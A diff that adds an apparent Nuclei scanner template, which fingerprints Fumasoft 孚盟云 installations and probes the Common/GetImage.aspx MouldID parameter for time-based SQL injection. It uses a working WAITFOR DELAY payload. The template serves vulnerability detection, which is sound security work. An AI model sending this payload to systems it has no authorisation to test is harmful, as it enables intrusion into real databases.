@@ -1,0 +1,45 @@
+id: fumasoft-getimage-sqli
+info:
+  name: Fumasoft GetImage.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5, 10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "孚盟云"
+
+  - raw:
+      - |
+        GET /Common/GetImage.aspx?MouldID=-1';WAITFOR+DELAY'0:0:{{t1}}'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "__VIEWSTATE"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < t2"
